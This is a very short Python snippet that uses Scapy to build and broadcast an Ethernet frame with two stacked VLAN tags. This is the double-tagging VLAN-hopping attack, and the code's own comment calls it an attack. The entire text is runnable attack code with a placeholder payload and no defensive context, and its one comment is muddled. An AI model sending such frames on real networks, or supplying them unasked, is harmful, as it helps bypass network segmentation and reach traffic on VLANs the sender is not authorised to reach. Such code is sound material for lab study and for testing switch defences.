from scapy.all import Ether, Dot1Q, sendp

  eth_frame_ = Ether(dst="ff:ff:ff:ff:ff:ff") / Dot1Q(vlan=10) / Dot1Q(vlan=20) / "Test Payload"

  sendp(eth_frame_, iface="eth0")# sendp is for deeper level of the internet level required for this attack type
